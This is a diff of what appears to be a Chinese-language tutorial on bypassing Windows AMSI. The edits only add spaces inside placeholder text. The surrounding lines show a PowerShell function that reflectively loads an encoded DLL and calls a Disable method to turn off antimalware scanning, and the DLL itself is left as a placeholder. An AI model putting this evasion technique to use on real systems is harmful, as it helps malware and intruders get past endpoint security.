@@ -306,7 +306,7 @@ Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedA
 unction Bypass-AMSI
 {
     if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
-        [Reflection.Assembly]::Load([Convert]::FromBase64String("你的base64编码")) | Out-Null
+        [Reflection.Assembly]::Load([Convert]::FromBase64String("你的 base64 编码")) | Out-Null
         Write-Output "DLL has been reflected";
     }
     [Bypass.AMSI]::Disable()
@@ -327,7 +327,7 @@ unction Bypass-AMSI
 
 ```plain
 $string = ''
- $a = [System.Convert]::FromBase64String('你的base64编码')
+ $a = [System.Convert]::FromBase64String('你的 base64 编码')
  $a | foreach {$string = $string + $_.ToString()+','}
  $string
 ```
@@ -338,7 +338,7 @@ $string = ''
 function Bypass-AMSI
 {
     if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
-        [Reflection.Assembly]::Load([byte[]]@(这里是上面得到的byte数组)) | Out-Null
+        [Reflection.Assembly]::Load([byte[]]@(这里是上面得到的 byte 数组)) | Out-Null
         Write-Output "DLL has been reflected";
     }
     [Bypass.AMSI]::Disable();
